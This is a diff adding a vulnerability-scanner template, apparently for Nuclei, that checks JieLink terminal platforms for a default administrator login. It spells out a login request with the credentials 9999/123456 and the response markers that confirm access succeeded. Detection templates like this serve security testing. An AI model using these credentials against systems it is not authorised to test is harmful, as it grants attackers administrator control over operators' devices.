@@ -1,0 +1,35 @@
+id: jielink-default-password
+
+info:
+  name: JieLink Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    JieLink is an intelligent terminal operating platform. It contains a default password vulnerability, allowing attackers to control the platform with administrator privileges.
+  reference:
+    - https://www.jieshun.cn/
+  tags: default-password
+
+http:
+  - raw:
+      - |
+        POST /Auth/Signin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{BaseURL}}
+
+        returnUrl={{BaseURL}}/home/main&username=9999&password=123456
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "JSST.AUTH"
+      - type: word
+        part: body
+        words:
+          - "home/main"
+          - "Object moved"
